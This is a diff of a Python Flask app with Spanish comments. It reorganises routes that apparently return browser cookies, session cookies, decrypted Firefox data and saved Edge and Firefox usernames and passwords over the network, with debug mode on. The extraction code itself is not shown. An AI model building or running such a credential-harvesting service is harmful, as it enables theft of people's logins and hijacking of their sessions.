@@ -46,9 +46,9 @@ def count_chrome_session_cookies():
 def index():
     return render_template('index.html')
 
-    # Obtner las cookies de edge
 
-
+############################################################################################################
+# controlador de edge
 @app.route('/cookies/edge', methods=['GET'])
 def get_edge_cookies():
     return jsonify(controller_edge.get_edge_cookies())
@@ -67,9 +67,26 @@ def get_edge_session_cookies():
 def count_edge_session_cookies():
     return jsonify(controller_edge.count_session_cookies())
 
-    # Obtner las cookies de firefox
+ # Obtner las cookies de edge
 
+@app.route('/usuarios/edge', methods=['GET'])
+def obtener_usuario_contrasenia():
+    return jsonify(controller_edge.obtener_usuario_contrasenia())
 
+@app.route('/usuarios/edge/paginas', methods=['GET'])
+def numeros_paginas_encontradas_sin_repetir():
+    return jsonify(controller_edge.numeros_paginas_encontradas_sin_repetir())
+
+@app.route('/usuarios/edge/top', methods=['GET'])
+def top_ten_paginas_encontradas_sin_repetir():
+    return jsonify(controller_edge.top_ten_paginas_encontradas_sin_repetir())
+
+@app.route('/usuarios/edge/contrasenias', methods=['GET'])
+def numero_contrasenias_encontradas():
+    return jsonify(controller_edge.numero_contrasenias_encontradas())
+
+############################################################################################################
+# controlador de firefox
 @app.route('/cookies/firefox', methods=['GET'])
 def get_firefox_cookies():
     return jsonify(controller_firefox.get_firefox_cookies())
@@ -104,23 +121,6 @@ def decrypt_firefox():
 def obtener_contrasenias():
     return jsonify(controller_firefox.obtener_contrasenias())
 
- # Obtner las cookies de edge
-
-@app.route('/usuarios/edge', methods=['GET'])
-def obtener_llave_session():
-    return jsonify(controller_edge.obtener_usuario_contrasenia())
-
-@app.route('/usuarios/edge/paginas', methods=['GET'])
-def numeros_paginas_encontradas_sin_repetir():
-    return jsonify(controller_edge.numeros_paginas_encontradas_sin_repetir())
-
-@app.route('/usuarios/edge/top', methods=['GET'])
-def top_ten_paginas_encontradas_sin_repetir():
-    return jsonify(controller_edge.top_ten_paginas_encontradas_sin_repetir())
-
-@app.route('/usuarios/edge/contrasenias', methods=['GET'])
-def numero_contrasenias_encontradas():
-    return jsonify(controller_edge.numero_contrasenias_encontradas())
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0',debug=True)
